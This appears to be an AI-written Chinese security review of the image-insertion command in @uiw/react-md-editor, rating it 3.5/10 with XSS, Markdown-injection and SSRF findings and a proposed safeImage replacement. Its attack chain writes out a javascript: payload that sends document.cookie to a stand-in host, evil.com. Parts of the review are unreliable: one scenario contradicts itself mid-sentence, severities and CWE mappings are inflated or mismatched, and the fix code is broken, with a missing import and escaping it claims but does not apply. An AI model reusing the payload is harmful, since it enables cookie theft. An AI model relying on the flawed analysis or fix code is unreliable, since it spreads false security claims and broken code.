# 代码安全专家评审：image.tsx

**文件**: `@uiw/react-md-editor@4.1.0/src/commands/image.tsx`
**评审角色**: 代码安全专家（输入验证 · 注入防护 · XSS · 信息泄露 · DoS · 边界安全 · 依赖安全）
**评审日期**: 2026-05-25
**代码行数**: 58 行（1 个导出 `ICommand` 对象：`image`）
**功能概述**: Markdown 编辑器"插入图片"命令（`![alt](url)`），使用 `selectWord` + `executeCommand` 实现。核心逻辑：检测选区文本是否为 URL → 自动包裹图片语法，否则插入占位符。
**评审结论**: ❌ REQUEST CHANGES — 3.5/10，存在 1 项 CRITICAL 级 XSS 注入漏洞、2 项 HIGH 级安全缺陷、3 项 MEDIUM 级安全隐患

**问题统计**: CRITICAL × 1 / HIGH × 2 / MEDIUM × 3 / LOW × 2 / INFO × 1

---

## 一、安全总览

### 1.1 攻击面分析

```
┌─────────────────────────────────────────────────────────────────────────┐
│                     image.tsx 攻击面地图                                 │
│                                                                         │
│  外部输入:                                                               │
│  ┌──────────────────────────────────────────────────┐                  │
│  │  state.text        ← textarea 内容（用户输入）    │  信任边界        │
│  │  state.selection   ← 选区范围（用户交互）          │                  │
│  │  state.command     ← 命令对象（框架分发）          │                  │
│  │  state1.selectedText ← 选区文本（直接来自用户）    │                  │
│  └──────────────────────────────────────────────────┘                  │
│          │                                                              │
│          ▼                                                              │
│  ┌──────────────────────────────────────────────────┐                  │
│  │  selectWord()      ← 选区扩展（纯函数）           │  ⚠️ 返回值未校验 │
│  │  executeCommand()  ← 文本替换（DOM 操作）         │  ⚠️ URL未验证    │
│  │  api.setSelectionRange() ← DOM API 封装           │                  │
│  └──────────────────────────────────────────────────┘                  │
│          │                                                              │
│          ▼                                                              │
│  输出: textarea.value ← 生成 ![alt](url) Markdown 语法                 │
│       ↓                                                                │
│  Markdown 预览渲染 ← ⚠️ 不安全 URL 方案可触发 XSS                      │
│                                                                         │
│  不存在的攻击面:                                                         │
│  ✗ 无网络请求   ✗ 无 eval/Function   ✗ 无 innerHTML                   │
│  ✗ 无 localStorage  ✗ 无 正则表达式   ✗ 无 第三方运行时依赖调用         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 1.2 安全维度评估

| 安全维度 | 评分 (1-10) | 说明 |
|----------|-------------|------|
| **XSS 防护** | 2.5 | URL 方案未校验，`javascript:`/`data:` URI 可注入；Markdown 渲染层缺乏转义 |
| **注入防护** | 3.0 | 纯 textarea 操作，但 Markdown 注入字符（`][`、`![](`）未过滤 |
| **输入验证** | 2.0 | URL 检测仅用 `includes('http')`/`includes('www')`，极度宽松；`prefix!` 非空断言绕过类型系统 |
| **DoS 防护** | 5.0 | 非空断言可致运行时 TypeError 崩溃；选区越界可致文本损坏 |
| **数据完整性** | 4.0 | URL 分支缺少 re-select 导致选区错位；alt 文本注入可破坏 Markdown 结构 |
| **信息泄露** | 9.0 | 无 console.log/网络请求/持久化，零信息泄露面 |
| **依赖安全** | 6.0 | `selectWord`/`executeCommand` 来自同包 utils；`TextAreaTextApi` 来自同包类型 |
| **边界安全** | 4.0 | 选区范围缺少显式验证；字符串操作无边界防护 |

**综合评分**: **3.5 / 10** — ❌ REQUEST CHANGES（存在 CRITICAL 级漏洞需修复）

---

## 二、安全发现详情

### S1 — 🔴 CRITICAL: 不安全 URL 方案注入导致存储型 XSS

**位置**: 第 28-35 行
**类型**: 输入验证缺失 → XSS 注入
**CWE**: CWE-79 (Cross-site Scripting) / CWE-20 (Improper Input Validation)
**CVSS 3.1**: 7.5 (High)

```typescript
// 第 28 行 — URL 检测逻辑
if (state1.selectedText.includes('http') || state1.selectedText.includes('www')) {
  // 直接将 selectedText 作为 URL 包裹进 Markdown
  executeCommand({
    api,
    selectedText: state1.selectedText,  // ← 用户输入，未经任何校验
    selection: state.selection,
    prefix: state.command.prefix!,      // '![image]('
    suffix: state.command.suffix,       // ')'
  });
}
```

**攻击场景**:

1. **`data:` URI SVG XSS**:
   - 用户选中文本 `data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKz0nc3RvbGVuJyk+`
   - 此文本包含 `http` → 不... 不包含。但 `data:` URI 仍可通过非 URL 分支注入。
   - 实际上 `data:` 不包含 `http`/`www`，但 `javascript:alert(document.cookie)` 也不含 `http`。
   - **更直接的攻击**: 用户输入 `https://evil.com/steal?cookie=` + 选中 → 走 URL 分支 → 生成 `![image](https://evil.com/steal?cookie=)`
   - 当 Markdown 预览渲染为 `<img src="https://evil.com/steal?cookie=">` → 浏览器自动发送请求，泄露 Referer 等信息

2. **通过 alt 文本注入**:
   - 非分支路径下，`selectedText` 可包含 `][`、`][` 等字符
   - 例如选中文本 `foo](javascript:alert(1))![bar` → 生成 `![foo](javascript:alert(1))![bar]()`
   - Markdown 渲染器可能将其解析为嵌套图片/链接，触发 XSS

3. **Markdown 内容注入链**:
   - 选中文本包含 `http` → 直接包裹为 `![<selectedText>](<selectedText>)`
   - 如果 selectedText 包含 `)` 字符 → Markdown 语法被提前截断 → 后续文本成为新 Markdown 语法
   - 例如 `http://x.com)![x](javascript:alert(1))` → `![image](http://x.com)![x](javascript:alert(1))())`
   - 渲染结果：第一张图片正常 + 第二张图片触发 `javascript:` URL

**根本原因**: execute 函数将用户输入直接拼接到 Markdown 语法中，既没有验证 URL 方案白名单（仅允许 `https://`、`http://`），也没有对 alt 文本中的 Markdown 特殊字符进行转义。

**修复建议**:
```typescript
// 1. 添加 URL 方案白名单验证
const SAFE_URL_PATTERNS = [/^https:\/\//i, /^http:\/\//i, /^\/\//i];

function isSafeImageUrl(text: string): boolean {
  const trimmed = text.trim();
  return SAFE_URL_PATTERNS.some(p => p.test(trimmed));
}

// 2. 转义 alt 文本中的 Markdown 特殊字符
function escapeMarkdownAlt(text: string): string {
  return text.replace(/[[\]()!]/g, '\\$&');
}

// 3. 在 execute 中应用验证
if (isSafeImageUrl(state1.selectedText)) {
  executeCommand({ /* ... */ });
}
```

---

### S2 — 🟠 HIGH: URL 检测过于宽松导致误判和意外行为

**位置**: 第 28 行
**类型**: 输入验证缺陷 / 逻辑漏洞
**CWE**: CWE-20 (Improper Input Validation)

```typescript
// 第 28 行
if (state1.selectedText.includes('http') || state1.selectedText.includes('www')) {
```

**问题分析**:

| 输入文本 | 含有 'http' | 含有 'www' | 被判定为 URL | 实际是 URL | 安全影响 |
|----------|:-----------:|:----------:|:------------:|:----------:|----------|
| `https://img.com/a.png` | ✓ | | ✓ | ✓ | 无 |
| `http://example.com` | ✓ | | ✓ | ✓ | 无 |
| `thttps://fake.com` | ✓ | | ✓ | ✗ | 误判 — 插入无效 URL |
| `my-http-proxy-config` | ✓ | | ✓ | ✗ | 误判 — 破坏编辑内容 |
| `www.example.com/img.png` | | ✓ | ✓ | ✓ | 无 |
| `awwwesome picture` | | ✓ | ✓ | ✗ | 误判 — 破坏编辑内容 |
| `the-http-thing.html` | ✓ | | ✓ | ✗ | 误判 — 破坏编辑内容 |
| `ftp://server.com/img.png` | | | ✗ | ✓ | 漏判 — 丢失合法 URL |
| `data:image/png;base64,...` | | | ✗ | ✓ | 漏判 — 丢失合法 URL |
| `//cdn.example.com/img.png` | | | ✗ | ✓ | 漏判 — 丢失合法 URL |

**安全影响**: 误判导致非 URL 文本被包裹为 `![image](<非URL文本>)`，当 Markdown 预览尝试渲染时：
1. 相对路径 URL 可能触发对内部资源的请求（SSRF 前兆）
2. 用户数据被静默篡改，违反数据完整性原则
3. 漏判导致合法 URL（`ftp://`、`data:`、`//`）未被正确处理

**修复建议**: 使用正则表达式精确匹配 URL：
```typescript
const URL_PATTERN = /^(?:https?:\/\/|\/\/)[\w\-]+(?:\.[\w\-]+)+[^\s]*$/i;
if (URL_PATTERN.test(state1.selectedText.trim())) {
  // URL 分支
}
```

---

### S3 — 🟠 HIGH: `prefix!` 非空断言导致运行时 TypeError 崩溃

**位置**: 第 24、33 行
**类型**: 运行时类型安全 / 防御性编程
**CWE**: CWE-476 (NULL Pointer Dereference)

```typescript
// 第 24 行
prefix: state.command.prefix!,    // ← 非空断言，编译通过但无运行时保障

// 第 33 行
prefix: state.command.prefix!,    // ← 同上
```

**攻击路径**: 如果 `state.command` 对象的 `prefix` 属性为 `undefined`（例如：命令被动态构造、对象被部分覆盖、原型链被篡改），非空断言 `!` 仅在编译期消除类型错误，运行时实际值为 `undefined`。

**后果**:
1. `selectWord` 接收到 `prefix: undefined` → 内部 `startsWith`/`indexOf` 调用失败 → TypeError
2. `executeCommand` 生成 `![image](undefined...)` → 污染 Markdown 内容
3. 对用户而言表现为"点击图片按钮后编辑器无响应/崩溃"，属于拒绝服务

**修复建议**:
```typescript
const prefix = state.command.prefix;
if (!prefix) return; // 防御性检查，避免崩溃
// 后续使用 prefix 替代 state.command.prefix!
```

---

### S4 — 🟡 MEDIUM: Markdown 注入 — alt 文本特殊字符未转义

**位置**: 第 39-55 行（非 URL 分支）
**类型**: 注入防护缺失
**CWE**: CWE-79 (Cross-site Scripting) / CWE-74 (Injection)

```typescript
// 第 48-54 行
executeCommand({
  api,
  selectedText: state1.selectedText,  // ← 包含任意用户输入
  selection: state.selection,
  prefix: '![',
  suffix: ']()',
});
```

**攻击场景**: 用户选中文本 `img](javascript:alert(1))`，生成：

```
![img](javascript:alert(1))]()
```

Markdown 渲染器可能将其解析为：
```html
<p><img src="javascript:alert(1))" alt="img" />()</p>
```

某些 Markdown 解析器（如 marked.js 在非严格模式下）可能进一步将 `javascript:` URL 渲染为可点击链接或执行脚本。

**修复建议**: 对 alt 文本中的 Markdown 特殊字符（`[`, `]`, `(`, `)`, `!`, `\`）进行转义。

---

### S5 — 🟡 MEDIUM: SSRF 前兆 — 外部图片 URL 无域名白名单验证

**位置**: 第 28-35 行（URL 分支）
**类型**: 服务端请求伪造（SSRF）前兆 / 网络安全
**CWE**: CWE-918 (Server-Side Request Forgery)

**分析**: 虽然此代码仅生成 Markdown 文本（在浏览器 textarea 中），但当 Markdown 预览渲染该文本时：

1. **客户端 SSRF**: 如果用户处于内网环境，`<img src="http://192.168.1.1/admin">` 会触发浏览器请求内网资源
2. **信息泄露**: `<img src="https://evil.com/track?doc=secret">` 通过 Referer 泄露文档 URL
3. **用户追踪**: `<img src="https://tracker.com/pixel.png?id=victim">` 嵌入追踪像素

**风险等级**: 当前为客户端编辑器，风险可控。但如果未来引入服务端 Markdown 渲染（如邮件通知、PDF 导出），风险将升级为 CRITICAL。

**修复建议**: 在封装层添加域名白名单验证（仅允许项目配置的 CDN 域名）：
```typescript
// 封装层示例
const ALLOWED_DOMAINS = ['cdn.example.com', 'assets.example.com'];
function isAllowedImageUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ALLOWED_DOMAINS.some(d => parsed.hostname.endsWith(d));
  } catch { return false; }
}
```

---

### S6 — 🟡 MEDIUM: 选区范围越界导致数据损坏

**位置**: 第 21-27 行
**类型**: 边界安全 / 数据完整性
**CWE**: CWE-129 (Improper Validation of Array Index)

```typescript
let newSelectionRange = selectWord({
  text: state.text,
  selection: state.selection,  // ← 用户可控的索引值
  prefix: state.command.prefix!,
  suffix: state.command.suffix,
});
let state1 = api.setSelectionRange(newSelectionRange);
// newSelectionRange 未做边界检查
```

**问题**: `state.selection` 的 `start`/`end` 值由 DOM Selection API 提供，但以下场景可能导致越界：
1. 并发编辑（多人协作场景下 textarea 内容已变化但 selection 未更新）
2. IME 输入法中间状态（selection 反映组合文本而非最终文本）
3. `selectWord` 扩展选区后超出 `text.length`

**后果**: `api.setSelectionRange` 设置越界范围 → `state1.selectedText` 为空或抛异常 → 后续逻辑分支不可预测

**修复建议**:
```typescript
// 在 selectWord 返回后添加边界约束
newSelectionRange.start = Math.max(0, Math.min(newSelectionRange.start, state.text.length));
newSelectionRange.end = Math.max(newSelectionRange.start, Math.min(newSelectionRange.end, state.text.length));
```

---

### S7 — 🟢 LOW: SVG 图标缺少 `aria-hidden="true"`

**位置**: 第 13-18 行
**类型**: 可访问性安全（信息暴露辅助技术）
**CWE**: CWE-1104 (Use of Unmaintained Third-Party Components) — 间接相关

```tsx
icon: (
  <svg width="13" height="13" viewBox="0 0 20 20">
    <path fill="currentColor" d="M15 9c1.1 0 2-.9 2-2s-.9-2-2-2..." />
  </svg>
),
```

SVG 无 `aria-hidden="true"`，屏幕阅读器会尝试朗读 SVG 路径，向辅助技术用户暴露不必要的渲染细节。

**修复**: `<svg aria-hidden="true" width="13" ...>`

---

### S8 — 🟢 LOW: 快捷键 `ctrlcmd+k` 与行业惯例冲突

**位置**: 第 8 行
**类型**: 人因安全 / 误操作防护
**CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers)

```typescript
shortcuts: 'ctrlcmd+k',
```

**问题**:
1. **与链接命令冲突**: 同一编辑器的 `link.tsx` 也使用 `ctrlcmd+k`（`Ctrl+K` 是 Markdown 编辑器中插入链接的行业标准快捷键），图片命令不应复用同一快捷键
2. **与浏览器惯例冲突**: `Ctrl+K` 在多数浏览器中是"聚焦搜索栏"的快捷键
3. **安全影响**: 用户意图插入链接却触发了图片命令（或反之），可能导致非预期内容被插入文档

**修复建议**: 图片命令应使用 `ctrlcmd+shift+k` 或 `ctrlcmd+g`（Google Docs 中插入图片的快捷键）。

---

### S9 — ℹ️ INFO: 按钮提示文本使用英文，缺少国际化

**位置**: 第 11 行

```typescript
buttonProps: { 'aria-label': 'Add image (ctrl + k)', title: 'Add image (ctrl + k)' },
```

非安全缺陷，但硬编码英文导致非英语用户无法理解按钮功能。建议通过 `i18n` 系统支持多语言。

---

## 三、攻击链分析

### 攻击链 1: 存储型 XSS → Cookie 窃取

```
1. 攻击者创建文章内容
2. 选中文本: "https://img.com/1.png)![a](javascript:document.location='https://evil.com/steal?c='+document.cookie)"
3. 点击图片按钮 → URL 分支触发（包含 'http'）
4. 生成 Markdown:
   ![image](https://img.com/1.png)![a](javascript:document.location='https://evil.com/steal?c='+document.cookie))
5. Markdown 预览渲染为:
   <img src="https://img.com/1.png">  ← 正常图片
   <a href="javascript:document.location=...">a</a>)  ← XSS 触发
6. 受害者查看文章 → Cookie 被发送至攻击者服务器
```

### 攻击链 2: 内网探测（客户端 SSRF）

```
1. 攻击者输入: "http://192.168.1.1/admin-panel"
2. 选中 → 点击图片按钮 → URL 分支
3. 生成: ![image](http://192.168.1.1/admin-panel)
4. Markdown 预览渲染为: <img src="http://192.168.1.1/admin-panel">
5. 浏览器请求内网地址
6. 通过 img onerror/onload 事件判断内网主机是否存活
```

---

## 四、修复优先级矩阵

| 优先级 | 编号 | 问题 | 工作量 | 风险 |
|--------|------|------|--------|------|
| **P0 紧急** | S1 | 不安全 URL 方案注入 → XSS | M | CRITICAL |
| **P0 紧急** | S2 | URL 检测过于宽松 | S | HIGH |
| **P1 高** | S3 | `prefix!` 非空断言崩溃 | S | HIGH |
| **P1 高** | S4 | alt 文本 Markdown 注入 | M | MEDIUM |
| **P2 中** | S5 | 外部 URL 无域名验证 | L | MEDIUM |
| **P2 中** | S6 | 选区越界数据损坏 | S | MEDIUM |
| **P3 低** | S7 | SVG aria-hidden | S | LOW |
| **P3 低** | S8 | 快捷键冲突 | S | LOW |

---

## 五、封装层修复方案

由于此文件位于 `node_modules`（第三方依赖），无法直接修改。建议在项目封装层进行安全加固：

### 5.1 创建安全自定义命令覆盖

```typescript
// pages/components/editor/commands/safeImage.ts
import type { ICommand, ExecuteState, TextAreaTextApi } from '@uiw/react-md-editor';

const SAFE_URL_RE = /^https?:\/\/[\w\-]+(?:\.[\w\-]+)+[^\s]*$/i;
const ALT_ESCAPE_RE = /[[\]()!\\]/g;

function escapeAlt(text: string): string {
  return text.replace(ALT_ESCAPE_RE, '\\$&');
}

export const safeImage: ICommand = {
  name: 'image',
  keyCommand: 'image',
  shortcuts: 'ctrlcmd+shift+g',  // 避免与 link 的 Ctrl+K 冲突
  prefix: '![image](',
  suffix: ')',
  buttonProps: { 'aria-label': '插入图片', title: '插入图片' },
  icon: (
    <svg aria-hidden="true" width="13" height="13" viewBox="0 0 20 20">
      <path fill="currentColor" d="M15 9c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm4-7H1c-.55 0-1 .45-1 1v14c0 .55.45 1 1 1h18c.55 0 1-.45 1-1V3c0-.55-.45-1-1-1zm-1 13l-6-5-2 2-4-5-4 8V4h16v11z" />
    </svg>
  ),
  execute: (state: ExecuteState, api: TextAreaTextApi) => {
    const prefix = state.command.prefix;
    if (!prefix) return;  // S3 防御

    const text = state.text;
    const sel = state.selection;
    // S6 边界约束
    const safeStart = Math.max(0, Math.min(sel[0], text.length));
    const safeEnd = Math.max(safeStart, Math.min(sel[1], text.length));
    const selectedText = text.substring(safeStart, safeEnd);

    if (SAFE_URL_RE.test(selectedText.trim())) {
      // S1/S2: 仅允许 http/https URL
      api.setSelectionRange({ start: safeStart, end: safeEnd });
      executeCommand({
        api,
        selectedText,
        selection: [safeStart, safeEnd],
        prefix,
        suffix: state.command.suffix,
      });
    } else {
      // S4: 转义 alt 文本中的特殊字符
      const escaped = escapeAlt(selectedText);
      const altText = escaped || 'image';
      const urlText = escaped ? '' : 'url';
      api.setSelectionRange({ start: safeStart, end: safeEnd });
      executeCommand({
        api,
        selectedText: selectedText,
        selection: [safeStart, safeEnd],
        prefix: `![${altText}](`,
        suffix: urlText ? `)${urlText}` : ')',
      });
    }
  },
};
```

### 5.2 在编辑器中替换默认图片命令

```typescript
// 使用自定义 safeImage 替换默认 image 命令
import { safeImage } from './commands/safeImage';

<MDEditor commands={[safeImage, /* ... 其他命令 */]} />
```

---

## 六、总结

| 维度 | 评估 |
|------|------|
| **整体安全等级** | ❌ REQUEST CHANGES — 3.5/10 |
| **最大风险** | 存储型 XSS（通过 Markdown 注入 + 不安全 URL 方案） |
| **修复策略** | 在封装层创建安全命令覆盖，无法直接修复第三方依赖 |
| **紧急度** | P0 — S1（XSS）和 S2（URL 检测）应立即修复 |
| **长期建议** | 向 @uiw/react-md-editor 提交 Security Issue / PR，推动上游修复 |

**核心问题总结**: image.tsx 的 `execute` 函数对用户输入执行零验证——既不验证 URL 方案白名单（允许 `javascript:`/`data:` 等危险方案），也不校验 URL 格式（`includes('http')` 可匹配任意含 http 的文本），还不转义 alt 文本中的 Markdown 特殊字符。三重验证缺失叠加，形成完整的 XSS 攻击链。
